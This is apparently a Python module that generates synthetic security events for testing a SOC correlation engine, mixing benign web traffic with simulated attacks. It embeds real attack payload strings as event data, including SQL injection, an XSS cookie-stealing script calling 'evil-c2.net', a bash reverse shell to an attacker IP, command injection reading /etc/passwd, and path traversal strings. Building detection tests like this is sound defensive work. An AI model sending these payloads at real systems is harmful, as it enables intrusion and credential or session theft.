"""
Cybersecurity Attack Simulator & Traffic Generator.
Generates realistic multi-vector cyber attack scenarios alongside benign enterprise web traffic
for evaluation, live SOC demonstration, and incident response drill.
"""
import random
import threading
import time
from typing import Optional, Callable
from core.models import SecurityEvent


class AttackSimulator:
    """Generates synthetic security events and coordinated cyberattacks."""

    def __init__(self, event_consumer: Optional[Callable[[SecurityEvent], None]] = None):
        self.event_consumer = event_consumer
        self.is_running = False
        self.thread: Optional[threading.Thread] = None

        # Sample attacker IPs
        self.attacker_ips = [
            "185.220.101.5",   # Tor exit node simulation
            "198.51.100.45",   # External APT actor
            "203.0.113.88",    # Botnet scanner
            "192.0.2.144",     # DoS booter service
            "194.26.29.112",   # Bulletproof hosting
        ]

        self.benign_ips = [
            "10.0.1.25",
            "10.0.2.44",
            "172.16.5.10",
            "192.168.1.105",
            "74.125.19.100",
            "151.101.1.69"
        ]

    def _dispatch(self, event: SecurityEvent):
        """Pass event to the consumer (e.g., correlation engine)."""
        if self.event_consumer:
            self.event_consumer(event)

    def trigger_sqli_attack(self) -> SecurityEvent:
        """Simulate an advanced SQL Injection attempt."""
        payloads = [
            ("' UNION SELECT null, username, password_hash FROM admin_users--", "/api/products?id="),
            ("' OR '1'='1' --", "/api/v1/auth/login"),
            ("1; WAITFOR DELAY '0:0:5'--", "/catalog/search?item="),
            ("1' AND SLEEP(5)#", "/user/lookup?query="),
            ("admin'--", "/login"),
        ]
        payload, base_uri = random.choice(payloads)
        ip = random.choice(self.attacker_ips)

        event = SecurityEvent(
            source_ip=ip,
            destination_ip="10.0.0.15",
            destination_port=443,
            method="GET" if "search" in base_uri or "id=" in base_uri else "POST",
            uri=f"{base_uri}{payload}",
            payload=f"username={payload}&pass=anything" if "login" in base_uri else "",
            status_code=500 if "SLEEP" in payload else 200,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            event_type="WEB_REQUEST"
        )
        self._dispatch(event)
        return event

    def trigger_xss_attack(self) -> SecurityEvent:
        """Simulate a Cross-Site Scripting (XSS) attack vector."""
        payloads = [
            ("<script>fetch('https://evil-c2.net/steal?c=' + document.cookie)</script>", "/comments/add"),
            ("<img src=x onerror=alert('SessionHijacked:'+document.cookie)>", "/profile/bio"),
            ("<iframe src='javascript:alert(1)'></iframe>", "/forum/post?id=12"),
            ("';alert(String.fromCharCode(88,83,83))//", "/search?q="),
        ]
        payload, base_uri = random.choice(payloads)
        ip = random.choice(self.attacker_ips)

        event = SecurityEvent(
            source_ip=ip,
            destination_ip="10.0.0.15",
            destination_port=443,
            method="POST" if "add" in base_uri or "bio" in base_uri else "GET",
            uri=base_uri,
            payload=payload,
            status_code=200,
            user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            event_type="WEB_REQUEST"
        )
        self._dispatch(event)
        return event

    def trigger_rce_attack(self) -> SecurityEvent:
        """Simulate a Remote Code Execution / Command Injection attempt."""
        payloads = [
            ("; cat /etc/passwd", "/api/diagnostics/ping?host=127.0.0.1"),
            ("| whoami && dir", "/cgi-bin/system_status?cmd="),
            ("; /bin/bash -i >& /dev/tcp/185.220.101.5/4444 0>&1", "/admin/exec"),
            ("powershell -encodedcommand SQBFAFgAKABOAGUAdwA...", "/api/tools/run"),
        ]
        payload, base_uri = random.choice(payloads)
        ip = random.choice(self.attacker_ips)

        event = SecurityEvent(
            source_ip=ip,
            destination_ip="10.0.0.15",
            destination_port=80,
            method="GET",
            uri=f"{base_uri}{payload}",
            payload="",
            status_code=500,
            user_agent="curl/7.68.0",
            event_type="WEB_REQUEST"
        )
        self._dispatch(event)
        return event

    def trigger_path_traversal(self) -> SecurityEvent:
        """Simulate a Directory / Path Traversal (LFI) attack."""
        payloads = [
            "../../../../../../etc/passwd",
            "..%2f..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts",
            "../../../../boot.ini",
            "..\\..\\..\\..\\windows\\win.ini"
        ]
        payload = random.choice(payloads)
        ip = random.choice(self.attacker_ips)

        event = SecurityEvent(
            source_ip=ip,
            destination_ip="10.0.0.15",
            destination_port=80,
            method="GET",
            uri=f"/download?file={payload}",
            payload="",
            status_code=403,
            user_agent="Mozilla/5.0 (compatible; ReconBot/1.0)",
            event_type="WEB_REQUEST"
        )
        self._dispatch(event)
        return event

    def trigger_brute_force_attack(self) -> list[SecurityEvent]:
        """Simulate a rapid credential brute-force storm."""
        ip = "198.51.100.45"
        events = []
        usernames = ["admin", "root", "administrator", "sysadmin", "oracle", "manager", "support"]

        for user in usernames:
            event = SecurityEvent(
                source_ip=ip,
                destination_ip="10.0.0.15",
                destination_port=443,
                method="POST",
                uri="/api/v1/auth/login",
                payload=f"username={user}&password=Password123!",
                status_code=401,
                user_agent="Python-Requests/2.31.0",
                event_type="AUTH_ATTEMPT"
            )
            self._dispatch(event)
            events.append(event)

        return events

    def trigger_port_scan(self) -> list[SecurityEvent]:
        """Simulate a multi-port reconnaissance port scan sweep."""
        ip = "203.0.113.88"
        target_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 1433, 3306, 3389, 5432, 8080, 8443]
        events = []

        for port in target_ports:
            event = SecurityEvent(
                source_ip=ip,
                destination_ip="10.0.0.15",
                source_port=random.randint(40000, 65000),
                destination_port=port,
                protocol="TCP",
                method="SYN",
                uri=f"tcp://10.0.0.15:{port}",
                status_code=404 if port in (80, 443, 8080) else 0,
                user_agent="Nmap NSE Scripting Engine",
                event_type="NETWORK_FLOW"
            )
            self._dispatch(event)
            events.append(event)

        return events

    def trigger_dos_flood(self) -> list[SecurityEvent]:
        """Simulate a volumetric DoS request flood."""
        ip = "192.0.2.144"
        events = []
        for _ in range(45):
            event = SecurityEvent(
                source_ip=ip,
                destination_ip="10.0.0.15",
                destination_port=80,
                method="GET",
                uri="/api/catalog/search?q=" + ("A" * 15),
                status_code=200,
                user_agent="Mozilla/5.0 (compatible; FloodBot/2.0)",
                event_type="WEB_REQUEST"
            )
            self._dispatch(event)
            events.append(event)

        return events

    def trigger_scanner_probe(self) -> SecurityEvent:
        """Simulate a scanner probing with tool signatures (Nikto / sqlmap)."""
        scanners = [
            ("sqlmap/1.6#stable (https://sqlmap.org)", "/index.php?id=1'"),
            ("Mozilla/5.0 (compatible; Nikto/2.1.6)", "/admin.php"),
            ("masscan/1.3.2", "/"),
            ("Go-http-client/1.1 (gobuster v3.5)", "/secret_backup.zip")
        ]
        ua, uri = random.choice(scanners)
        ip = random.choice(self.attacker_ips)

        event = SecurityEvent(
            source_ip=ip,
            destination_ip="10.0.0.15",
            destination_port=80,
            method="GET",
            uri=uri,
            status_code=404,
            user_agent=ua,
            event_type="WEB_REQUEST"
        )
        self._dispatch(event)
        return event

    def trigger_ml_anomaly_payload(self) -> SecurityEvent:
        """Simulate an obfuscated, high-entropy payload that evades naive regex matching."""
        # High entropy base64-like payload with random binary-like tokens
        entropy_payload = (
            "k8%2B9v1X%2F3Lz9%2BmQO8%2FWwJ9%2B2vLxT%2F7Pz6%2BrKx"
            "9%2FQv7y8%2F4D%2B9%2Fv4%2Bv%2FQw8v%2Fz8%2FLw%3D%3D"
            "%26cmd%3D%2524%2528%2565%2576%2561%256C%2529"
        )
        ip = random.choice(self.attacker_ips)

        event = SecurityEvent(
            source_ip=ip,
            destination_ip="10.0.0.15",
            destination_port=8080,
            method="POST",
            uri="/api/v2/telemetry/ingest",
            payload=entropy_payload,
            status_code=500,
            user_agent="RawSocketClient/3.0",
            event_type="WEB_REQUEST"
        )
        self._dispatch(event)
        return event

    def trigger_benign_traffic(self) -> SecurityEvent:
        """Simulate ordinary, legitimate enterprise user traffic."""
        endpoints = [
            ("/home", "GET", ""),
            ("/products", "GET", ""),
            ("/products?cat=electronics&sort=price", "GET", ""),
            ("/api/v1/cart/items", "GET", ""),
            ("/api/v1/cart/add", "POST", '{"item_id": 104, "quantity": 1}'),
            ("/user/profile", "GET", ""),
            ("/help/faq", "GET", ""),
            ("/static/css/theme.css", "GET", ""),
            ("/static/js/bundle.js", "GET", ""),
            ("/about", "GET", "")
        ]
        uri, method, payload = random.choice(endpoints)
        ip = random.choice(self.benign_ips)

        event = SecurityEvent(
            source_ip=ip,
            destination_ip="10.0.0.15",
            destination_port=443,
            method=method,
            uri=uri,
            payload=payload,
            status_code=200,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36",
            event_type="WEB_REQUEST"
        )
        self._dispatch(event)
        return event

    def start_continuous_feed(self, interval_seconds: float = 1.0):
        """Start a background thread generating a realistic stream of traffic and occasional attacks."""
        if self.is_running:
            return

        self.is_running = True

        def _worker():
            attack_methods = [
                self.trigger_sqli_attack,
                self.trigger_xss_attack,
                self.trigger_rce_attack,
                self.trigger_path_traversal,
                self.trigger_brute_force_attack,
                self.trigger_port_scan,
                self.trigger_dos_flood,
                self.trigger_scanner_probe,
                self.trigger_ml_anomaly_payload
            ]

            while self.is_running:
                # 80% benign traffic, 20% cyber attacks
                if random.random() < 0.80:
                    self.trigger_benign_traffic()
                else:
                    action = random.choice(attack_methods)
                    action()

                time.sleep(interval_seconds)

        self.thread = threading.Thread(target=_worker, daemon=True)
        self.thread.start()

    def stop_continuous_feed(self):
        """Stop continuous simulation thread."""
        self.is_running = False
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=1.0)
            self.thread = None
